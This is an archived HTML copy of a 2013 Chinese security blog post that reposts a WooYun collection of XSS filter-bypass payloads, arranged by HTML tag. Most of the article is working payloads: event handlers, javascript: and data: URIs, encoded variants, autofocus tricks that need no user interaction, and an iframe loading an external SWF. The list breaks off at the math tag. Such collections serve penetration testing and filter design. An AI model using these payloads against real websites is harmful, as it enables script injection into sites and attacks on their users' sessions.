@@ -1,0 +1,326 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>那些年我们没能bypass的xss filter[from wooyun] | 离别歌</title>
+<link href="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/styles.css" rel="stylesheet"/>
+<link href="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/style.css" rel="stylesheet"/>
+<link href="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/jquery.min.js"></script>
+<link href="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/code.css" rel="stylesheet"/>
+<link href="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/button.css" rel="stylesheet"/>
+<link href="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/xss-collect.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/xss-collect.html&amp;text=%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E6%B2%A1%E8%83%BDbypass%E7%9A%84xss%20filter%5Bfrom%20wooyun%5D"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/xss-collect.html&amp;title=%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E6%B2%A1%E8%83%BDbypass%E7%9A%84xss%20filter%5Bfrom%20wooyun%5D"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/xss-collect.html&amp;is_video=false&amp;description=%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E6%B2%A1%E8%83%BDbypass%E7%9A%84xss%20filter%5Bfrom%20wooyun%5D"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E6%B2%A1%E8%83%BDbypass%E7%9A%84xss%20filter%5Bfrom%20wooyun%5D&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/xss-collect.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/xss-collect.html&amp;title=%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E6%B2%A1%E8%83%BDbypass%E7%9A%84xss%20filter%5Bfrom%20wooyun%5D"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/xss-collect.html&amp;title=%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E6%B2%A1%E8%83%BDbypass%E7%9A%84xss%20filter%5Bfrom%20wooyun%5D"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/xss-collect.html&amp;title=%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E6%B2%A1%E8%83%BDbypass%E7%9A%84xss%20filter%5Bfrom%20wooyun%5D"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/xss-collect.html&amp;title=%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E6%B2%A1%E8%83%BDbypass%E7%9A%84xss%20filter%5Bfrom%20wooyun%5D"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/xss-collect.html&amp;name=%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E6%B2%A1%E8%83%BDbypass%E7%9A%84xss%20filter%5Bfrom%20wooyun%5D&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">那些年我们没能bypass的xss filter[from wooyun]</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2013年9月22日 23:14" itemprop="datePublished">
+                    2013 九月 22 23:14
+                </time>
+</div>
+<div class="article-tag">
+            阅读：6343
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/xss">xss</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>
+	这么久没发文章，因为很忙。。为了防止站点被老顾客嫌弃，转载一篇来自乌云的文章吧：《那些年我们没能bypass的xss filter》
+</p>
+<p>
+<span id="__kindeditor_bookmark_start_0__"></span>原文链接：http://zone.wooyun.org/content/6899
+</p>
+<p>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">小弟初学xss才10天。不过个人很喜欢收集xss payload.在这里把自己平时挖xss时会用到的payloads列出来和大家一起分享。很希望大家能把自己的一些payload也分享出来。（由于我是linux党，所以本文出现在的所有payload只在firefox和chrome之下进行过测试。IE不在本文的讨论范围之内。本文只以直接输出在HTML的情况为中心进行探讨。）有错误的地方还请大家不吝赐教。 </span><br>
+<br>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">  在XSS的世界里，有很多标签,事件，属性都是可以拿来执行js的。但是又都有哪一些呢？ </span><br/>
+<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">可以执行js的标签: </span><br/>
+&lt;script&gt; &lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;iframe&gt; &lt;object&gt; &lt;input&gt; &lt;select&gt; &lt;textarea&gt; &lt;keygen&gt; &lt;frameset&gt; &lt;embed&gt; &lt;svg&gt; &lt;math&gt; &lt;video&gt; &lt;audio&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">所有的event都是可以执行js: </span><br/>
+onload onunload onchange onsubmit onreset onselect onblur onfocus onabort onkeydown onkeypress onkeyup onclick ondbclick onmouseover onmousemove onmouseout onmouseup onforminput onformchange ondrag ondrop<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">可以执行js的属性: </span><br/>
+formaction action href xlink:href autofocus src content data<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">  我们为什么要去理解这些呢？因为很多网站的filter都是基于黑名单的，而因为自身对可以执行js的标签，事件和属性的不了解，会导致你绕不过这个filter或者饶一个很大的弯子（当然也会有很多放弃的例子）。也许你正在尝试跳出的双引号是不需要跳出去的。也许你正在尝试跳出去的标签也是不需要跳出去的。因为你已经站在了可以插入js的地方却浑然不知。这也是写本文最主要的原因。下面我将以问答的方式，对各个payload进行简单的介绍。 </span><br/>
+<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">我们真的需要一个合法的标签么？ </span><br/>
+&lt;M/onclick="alert(1)"&gt;M<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">当目标站对关键tag做了黑名单过滤的时候，你也许可以尝试一下自定义标签。 </span><br/>
+<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">标签和属性之间只能出现空格么？ </span><br/>
+&lt;img/src=x onerror=alert(1)&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">在有些情况下我们可以使用"/"来代替空格 </span><br/>
+<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">二十个字符真的是最短的？ </span><br/>
+&lt;b/ondrag=alert()&gt;M  //其实19个字符是可以有的。请在IE下测试（wineIE8测试通过）<br/>
+<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">你真的了解【a标签】么？ </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">你也许会告诉我，谁不知道啊！不就href里面搞个javascript伪协议然后调用js不就完了。如果你真得这么认为的话，那么我觉得你已经完了。在href当中我们不仅仅可以使用javascript我们还可以使用data URI来调用我们的js代码，像这样: </span><br/>
+&lt;a href=javascript:alert(2)&gt;M <br/>
+&lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">可以看到第一个例子就是我们最常见的方法，通过javascript伪造协议来调用js了。而在第二个例子当中我们可以看到我们不但通过data协议来执行了javascript还对我们的payload进行了base64编码。我们可以解码看一下PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==究竟是什么。解码之后我们可以看到是&lt;script&gt;alert(3)&lt;/script&gt;。聪明的人又会说了还整base64老子直接写也能弹。如果目标站点对&lt;script&gt;进行了过滤，那么也许你的payload就会死在半路上了。当然编码方式还有很多比如urlencode,hex,demical和HTML实体编码 </span><br/>
+&lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;M <br/>
+&lt;a href=j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)&gt;M<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">当你在测试payload的时候你应该多细心善于了解filter真正的在过滤什么。也许它只是把":"添加到了黑名单当中，来防止你来通过伪造协议执行js，而你却认为整个javascript或data都被过滤了。在这种情况下你就可以考虑通过html实体编码来bypass了. </span><br/>
+&lt;a href=javascript&amp;colon;confirm(2)&gt;M<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">其实a标签拥有的不止是href.在一些猥琐的组合之下，我们可以用这种组合来让xlink:href执行js. </span><br/>
+&lt;svg&gt;&lt;a xlink:href="javascript:alert(14)"&gt;&lt;rect width="1000" height="1000" fill="white"/&gt;&lt;/a&gt;&lt;/svg&gt; <br/>
+&lt;math&gt;&lt;a xlink:href=javascript:alert(1)&gt;M<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【script标签】之弹窗姿势知多少 </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">很多时候我们都会用&lt;script&gt;alert(1)&lt;/script&gt;来测试XSS脆弱性。但是太过于规范的姿势往往会死在半路上（因为有filter的嘛）。所以我们需要更多的姿势，来判断真正的过滤规则到底是什么。相信我，程序员的安全水平都是参差不起的，过滤alert()的程序员我也碰到过。（此处省略3W字的吐槽） </span><br/>
+&lt;script&gt;alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])&lt;/script&gt; //想玩这个，可以在这里转换你的编码 http://www.jsfuck.com/ <br/>
+&lt;script firefox&gt;alert(1)&lt;/script&gt;  //其实我们并不需要一个规范的script标签 <br/>
+&lt;script&gt;~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')&lt;/script&gt; // <br/>
+&lt;script/src=data&amp;colon;text/j\u0061v\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script&gt;//在这里我们依然可以使用那些编码 <br/>
+&lt;script&gt;prompt(-[])&lt;/script&gt; //不只是alert。prompt和confirm也可以弹窗 <br/>
+&lt;script&gt;alert(/3/)&lt;/script&gt; //可以用"/"来代替单引号和双引号 <br/>
+&lt;script&gt;alert(String.fromCharCode(49))&lt;/script&gt; //我们还可以用char <br/>
+&lt;script&gt;alert(/7/.source)&lt;/script&gt; // ".source"不会影响alert(7)的执行 <br/>
+&lt;script&gt;setTimeout('alert(1)',0)&lt;/script&gt; //如果输出是在setTimeout里，我们依然可以直接执行alert(1)<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【button标签】 </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">应该有一部分人对于button标签的js调用还停留在通过event事件来实现。像下面的例子. </span><br/>
+&lt;button/onclick=alert(1) &gt;M&lt;/button&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">那么如果所有的on*(event)被过滤了，我们就没有办法了么？其实html5已经给我们带来了新的姿势 </span><br/>
+&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;M<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">也许看到这里就有人会吐槽，这种需要用户交互的啊 bla,bla,bla..（几个小时过去了）如果使用onfocus事件，再加上autofocus我们就可以达到自动弹窗，无须交互了。 </span><br/>
+&lt;button onfocus=alert(1) autofocus&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【p标签】 </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">如果你发现变量输出在了p标签里，先不要急着从标签跳出去，因为只要你能跳出""就已经足够了。 </span><br/>
+&lt;p/onmouseover=javascript:alert(1); &gt;M&lt;/p&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【img标签】 </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">img标签没有什么好讲的了。不过值得注意的是，有些姿势是因浏览器不通而不能成功的执行的。所以在空闲时间对payload进行分类，做上可执行浏览器的注释来提高你挖掘XSS的效率。 </span><br/>
+&lt;img src=x onerror=alert(1)&gt; <br/>
+&lt;img src ?itworksonchrome?\/onerror = alert(1)&gt;  //只在chrome下有效 <br/>
+&lt;img src=x onerror=window.open('http://google.com');&gt; <br/>
+&lt;img/src/onerror=alert(1)&gt;  //只在chrome下有效 <br/>
+&lt;img src="x:kcf" onerror="alert(1)"&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【body标签】 </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">没有什么特别之处，都是通过event来调用js </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">&lt;body onload=alert(1)&gt; </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt; </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【var标签】 </span><br/>
+&lt;var onmouseover="prompt(1)"&gt;KCF&lt;/var&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【div标签】 </span><br/>
+&lt;div/onmouseover='alert(1)'&gt;X <br/>
+&lt;div style="position:absolute;top:0;left:0;width:100%;height:100%" onclick="alert(52)"&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【iframe标签】 </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">iframe这个例子当中值得一提的是，有时候我们可以通过实体编码&amp;NewLine;&amp;Tab（换行和tab字符）来bypass一些filter。我们还可以通过事先在swf文件中插入我们的xss code,然后通过src属性来调用。不过关于flash值得一提的是，只有在crossdomain.xml文件中，allow-access-from domain=“*"允许从外部调用swf时，我们才可以通过flash来实现xss attack. </span><br/>
+&lt;iframe  src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt;   <br/>
+&lt;iframe  src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt; <br/>
+&lt;iframe SRC="http://0x.lv/xss.swf"&gt;&lt;/iframe&gt; <br/>
+&lt;IFRAME SRC="javascript:alert(1);"&gt;&lt;/IFRAME&gt; <br/>
+&lt;iframe/onload=alert(53)&gt;&lt;/iframe&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【meta标签】 </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">很多时候，在做xss测试时，你会发现你的昵称，文章标题跑到俄meta标签里。那么你只需要跳出当前属性再添加http-equiv="refresh",就可以构造一个有效的xss payload了。当然一些猥琐流的玩法，会通过给http-equiv设置set-cookie来，进一步重新设置cookie来干一些猥琐的事情 </span><br/>
+&lt;meta http-equiv="refresh" content="0;javascript&amp;colon;alert(1)"/&gt;? <br/>
+&lt;meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【object标签】 </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">和a标签的href属性玩法是一样的，不过优点是无须交互。 </span><br/>
+&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&gt;&lt;/object&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【marquee标签】 </span><br/>
+&lt;marquee  onstart="alert('sometext')"&gt;&lt;/marquee&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【isindex标签】 </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">第二个例子，值得我们注意一的是在一些只针对属性做了过滤的webapp当中，action很可能就是漏网之鱼。 </span><br/>
+&lt;isindex type=image src=1 onerror=alert(1)&gt; <br/>
+&lt;isindex action=javascript:alert(1) type=image&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【input标签】 </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">没有什么特别之处，通过event来调用js。和之前的button的例子一样通过 autofocus来达到无须交互即可弹窗的效果。在这里使用到了onblur是希望大家学会举一反三。 </span><br/>
+&lt;input onfocus=javascript:alert(1) autofocus&gt; <br/>
+&lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【select标签】 </span><br/>
+&lt;select onfocus=javascript:alert(1) autofocus&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【textarea标签】 </span><br/>
+&lt;textarea onfocus=javascript:alert(1) autofocus&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【keygen标签】 </span><br/>
+&lt;keygen onfocus=javascript:alert(1) autofocus&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【frameset标签】 </span><br/>
+&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert(1);"&gt;&lt;/FRAMESET&gt; <br/>
+&lt;frameset onload=alert(1)&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【embed标签】 </span><br/>
+&lt;embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="&gt;&lt;/embed&gt; //chrome <br/>
+&lt;embed src=javascript:alert(1)&gt; //firefox<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【svg标签】 </span><br/>
+&lt;svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"&gt;&lt;/svg&gt; <br/>
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;g onload="javascript:alert(1)"&gt;&lt;/g&gt;&lt;/svg&gt;  //chrome有效<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【math标签】 </span><br/>
